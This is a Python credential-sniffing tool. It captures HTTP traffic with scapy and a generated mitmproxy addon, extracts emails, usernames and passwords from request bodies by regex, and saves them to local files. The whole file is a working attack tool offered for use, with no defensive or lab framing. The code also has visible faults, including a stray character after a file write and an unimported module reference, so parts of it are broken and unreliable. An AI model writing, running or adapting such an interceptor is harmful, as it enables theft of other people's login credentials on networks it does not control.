import re
import subprocess
import threading
import time
from scapy.all import sniff, Raw
from scapy.layers.http import HTTPRequest  # import HTTP packet

# Shared data structure to store credentials
credentials = []

# Function to extract email, username, and password using regex
def extract_credentials(packet):
    global credentials
    if packet.haslayer(Raw):
        load = packet[Raw].load.decode(errors='ignore')

        # Regex patterns for email, username, and password
        email_pattern = re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+')
        password_pattern = re.compile(r'password=([^&\s]+)')
        username_pattern = re.compile(r'username=([^&\s]+)')

        emails = email_pattern.findall(load)
        passwords = password_pattern.findall(load)
        usernames = username_pattern.findall(load)

        if emails:
            print("[*] Found Email(s):", emails)
            credentials.extend([f"Email: {email}" for email in emails])
        if passwords:
            print("[*] Found Password(s):", passwords)
            credentials.extend([f"Password: {password}" for password in passwords])
        if usernames:
            print("[*] Found Username(s):", usernames)
            credentials.extend([f"Username: {username}" for username in usernames])

# Function to process each packet
def process_packet(packet):
    if packet.haslayer(HTTPRequest):
        http_layer = packet[HTTPRequest]
        print(f"[*] {http_layer.Method.decode()} {http_layer.Host.decode()}{http_layer.Path.decode()}")
        extract_credentials(packet)

# Function to start sniffing
def start_sniffing(interface):
    print("[*] Starting packet sniffer on interface:", interface)
    sniff(iface=interface, prn=process_packet, store=False)

# Function to start mitmproxy and capture logs
def start_mitmproxy():
    print("[*] Starting mitmproxy...")
    mitmproxy_proc = subprocess.Popen(["sudo", "mitmproxy", "-s", "mitm_sniffer.py"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return mitmproxy_proc

# mitmproxy script content
mitm_sniffer_script = """
import re
from mitmproxy import http

credentials = []

# Function to extract email, username, and password using regex
def extract_credentials(flow: http.HTTPFlow):
    global credentials
    if flow.request.content:
        load = flow.request.content.decode(errors='ignore')

        # Regex patterns for email, username, and password
        email_pattern = re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+')
        password_pattern = re.compile(r'password=([^&\\s]+)')
        username_pattern = re.compile(r'username=([^&\\s]+)')

        emails = email_pattern.findall(load)
        passwords = password_pattern.findall(load)
        usernames = username_pattern.findall(load)

        if emails:
            print("[*] Found Email(s):", emails)
            credentials.extend([f"Email: {email}" for email in emails])
        if passwords:
            print("[*] Found Password(s):", passwords)
            credentials.extend([f"Password: {password}" for password in passwords])
        if usernames:
            print("[*] Found Username(s):", usernames)
            credentials.extend([f"Username: {username}" for username in usernames])

        # Save credentials to file and signal completion
        if credentials:
            with open("credentials.txt", "w") as f:
                f.write("\\n".join(credentials))
            mitmproxy.ctx.master.shutdown()

# mitmproxy event handler
def request(flow: http.HTTPFlow) -> None:
    print(f"[*] {{flow.request.method}} {{flow.request.host}}{{flow.request.path}}")
    extract_credentials(flow)
"""

# Save mitm_sniffer.py content to a temporary file
with open("mitm_sniffer.py", "w") as f:
    f.write(mitm_sniffer_script)

def monitor_mitmproxy_logs(mitmproxy_proc):
    global credentials
    logs = []
    start_time = time.time()
    while True:
        output = mitmproxy_proc.stdout.readline()
        if output == '' and mitmproxy_proc.poll() is not None:
            break
        if output:
            print(output.strip())
            logs.append(output.strip())
            if "Found Email(s)" in output or "Found Password(s)" in output or "Found Username(s)" in output:
                # Capture credentials
                pass
        if time.time() - start_time > 120:  # 2 minutes
            # Timeout after 2 minutes
            break
    
    # Save the logs to a file
    with open("mitmproxy_logs.txt", "w") as f:
        f.write("\n".join(logs))
    
    # Ensure mitmproxy is terminated
    mitmproxy_proc.terminate()
    mitmproxy_proc.wait()

if __name__ == "__main__":
    interface = "eth0"  # Replace with your network interface

    # Save mitm_sniffer.py content to a temporary file
    with open("mitm_sniffer.py", "w") as f:
        f.write(mitm_sniffer_script)

    # Start mitmproxy
    mitmproxy_proc = start_mitmproxy()

    # Start monitoring mitmproxy logs in a separate thread
    log_monitor_thread = threading.Thread(target=monitor_mitmproxy_logs, args=(mitmproxy_proc,))
    log_monitor_thread.start()

    # Start packet sniffing in the main thread
    sniffing_thread = threading.Thread(target=start_sniffing, args=(interface,))
    sniffing_thread.start()

    # Wait for log monitor thread to finish
    log_monitor_thread.join()
    sniffing_thread.join()

    # Save the extracted credentials to a text file
    if credentials:
        with open("credentials.txt", "w") as f:
            f.write("\n".join(credentials))
        print("[*] Credentials saved to credentials.txt")
    else:
        print("[*] No credentials found")
    
    # Save mitmproxy logs
    logs = []
    while True:
        output = mitmproxy_proc.stdout.readline()
        if output == '' and mitmproxy_proc.poll() is not None:
            break
        if output:
            logs.append(output.strip())
    
    with open("mitmproxy_logs.txt", "w") as f:
        f.write("\n".join(logs))z
    
    print("[*] mitmproxy logs saved to mitmproxy_logs.txt")